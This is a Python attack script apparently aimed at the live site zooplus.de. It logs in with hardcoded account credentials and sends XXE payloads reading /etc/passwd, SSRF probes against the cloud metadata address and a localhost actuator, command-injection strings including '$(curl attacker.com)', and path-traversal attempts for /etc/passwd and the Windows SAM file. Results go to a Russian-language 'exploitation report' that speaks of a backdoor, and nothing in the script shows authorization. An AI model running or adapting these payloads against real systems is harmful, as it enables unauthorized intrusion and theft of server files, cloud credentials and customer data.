#!/usr/bin/env python3
"""Final comprehensive test - all vectors"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Test state-api for file upload via article data
print("[*] Testing state-api for file upload...")
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

# Try to upload file via state-api
try:
    payload = {
        "articleId": "test",
        "quantity": 1,
        "file": svg_xxe,
        "image": svg_xxe,
        "attachment": svg_xxe,
    }
    resp = s.post(
        f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity",
        json=payload,
        timeout=3,
        verify=False
    )
    if resp.status_code == 200:
        if "root:" in resp.text:
            print(f"  [CRITICAL] File upload via state-api!")
            found_vulns.append({
                "type": "file_upload_xxe",
                "severity": "CRITICAL",
                "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity"
            })
except: pass

# 2. Test cart-api for file upload
print("\n[*] Testing cart-api for file upload...")
cart_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
try:
    files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
    resp = s.post(f"{base}/checkout/api/cart-api/v2/cart/{cart_uuid}/upload", files=files, timeout=3, verify=False)
    if resp.status_code in [200, 201, 302]:
        if "root:" in resp.text:
            print(f"  [CRITICAL] SVG XXE in cart-api!")
            found_vulns.append({
                "type": "svg_xxe_lfi",
                "severity": "CRITICAL",
                "endpoint": f"/checkout/api/cart-api/v2/cart/{cart_uuid}/upload"
            })
except: pass

# 3. Test customer-config for file upload
print("\n[*] Testing customer-config for file upload...")
customer_id = 53260633
try:
    files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
    resp = s.post(f"{base}/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}/upload", files=files, timeout=3, verify=False)
    if resp.status_code in [200, 201, 302]:
        if "root:" in resp.text:
            print(f"  [CRITICAL] SVG XXE in customer-config!")
            found_vulns.append({
                "type": "svg_xxe_lfi",
                "severity": "CRITICAL",
                "endpoint": f"/myaccount/api/customer-config/v1/customerconfiguration/{customer_id}/upload"
            })
except: pass

# 4. Test for SSRF in state-api/get
print("\n[*] Testing SSRF in state-api/get...")
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/actuator",
    "file:///etc/passwd",
]

for payload in ssrf_payloads:
    try:
        resp = s.post(
            f"{base}/semiprotected/api/checkout/state-api/v2/get",
            json={"url": payload, "endpoint": payload, "callback": payload},
            timeout=5,
            verify=False
        )
        if resp.status_code == 200:
            if "169.254.169.254" in resp.text or "instance-id" in resp.text.lower() or "ami-id" in resp.text.lower() or "root:" in resp.text:
                print(f"  [CRITICAL] SSRF in state-api/get: {payload}")
                found_vulns.append({
                    "type": "ssrf",
                    "severity": "CRITICAL",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/get",
                    "payload": payload
                })
    except: pass

# 5. Test for Command Injection in state-api
print("\n[*] Testing Command Injection in state-api...")
cmd_payloads = [
    "; cat /etc/passwd",
    "| whoami",
    "`id`",
    "$(curl attacker.com)",
]

for payload in cmd_payloads:
    try:
        resp = s.post(
            f"{base}/semiprotected/api/checkout/state-api/v2/set-article-quantity",
            json={"articleId": payload, "quantity": 1},
            timeout=5,
            verify=False
        )
        if resp.status_code == 200:
            if "uid=" in resp.text or "root:" in resp.text or "www-data" in resp.text:
                print(f"  [CRITICAL] Command Injection: {payload}")
                found_vulns.append({
                    "type": "command_injection",
                    "severity": "CRITICAL",
                    "endpoint": "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
                    "payload": payload
                })
    except: pass

# 6. Test for Path Traversal
print("\n[*] Testing Path Traversal...")
path_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

for payload in path_payloads:
    try:
        resp = s.get(f"{base}/api/file?path={payload}&file={payload}", timeout=3, verify=False)
        if resp.status_code == 200 and "root:" in resp.text:
            print(f"  [CRITICAL] Path Traversal: {payload}")
            found_vulns.append({
                "type": "path_traversal",
                "severity": "CRITICAL",
                "endpoint": "/api/file",
                "payload": payload
            })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ - БЕКДОР И ДРУГИЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No additional critical vulnerabilities found")

print("=" * 70)

